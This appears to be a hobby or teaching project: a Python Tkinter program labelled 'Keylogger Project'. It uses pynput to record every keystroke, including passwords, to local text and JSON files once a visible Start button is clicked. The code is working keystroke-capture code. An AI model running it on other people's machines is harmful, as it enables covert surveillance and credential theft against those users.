import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("200x200")
root.title("Keylogger Project")

key_list = []
key_strokes = ""
current_key_event = {}

def format_key(key):
    try:
        return key.char
    except AttributeError:
        return str(key)

def update_txt_file(text):
    with open('logs.txt', 'w', encoding='utf-8') as f:
        f.write(text)

def update_json_file():
    with open('logs.json', 'w', encoding='utf-8') as f:
        json.dump(key_list, f, indent=4)

def on_press(key):
    global current_key_event
    k = format_key(key)
    if not current_key_event:
        current_key_event = {
            "Pressed": k,
            "Held": k
        }
    else:
        current_key_event["Held"] = k
def on_release(key):
    global current_key_event, key_strokes
    k = format_key(key)
    current_key_event["Released"] = k
    key_list.append(current_key_event)
    current_key_event = {}
    key_strokes += k + " "
    update_txt_file(key_strokes)
    update_json_file()
    if key == keyboard.Key.esc:
        status_label.config(text="Logging stopped")
        return False
def start_logger():
    status_label.config(text="Logging started")
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

status_label = Label(root, text="Click Start")
status_label.pack(pady=10)

start_btn = Button(root, text="Start Logger", command=start_logger)
start_btn.pack(pady=10)

exit_btn = Button(root, text="Exit", command=root.destroy)
exit_btn.pack(pady=10)

root.mainloop()
